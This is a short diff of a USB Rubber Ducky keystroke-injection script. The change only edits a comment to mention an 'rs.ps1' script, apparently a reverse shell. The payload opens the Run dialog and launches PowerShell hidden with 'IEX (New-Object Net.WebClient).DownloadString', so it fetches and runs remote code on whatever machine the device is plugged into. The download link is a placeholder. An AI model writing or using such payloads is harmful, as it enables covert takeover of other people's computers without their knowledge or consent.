@@ -25,7 +25,7 @@ DELAY 300
 ALT F4
 GUI r
 DELAY 600
-REM open up powershell in hidden mode and run the command you have already uploaded somewhere so that the ducky does not have to type it all out
+REM open up powershell in hidden mode, run the command (the rs.ps1 that needs to be edited )you have already uploaded somewhere so that the ducky does not have to type it all out
 STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('LINK HERE');
 ENTER
 DELAY 600
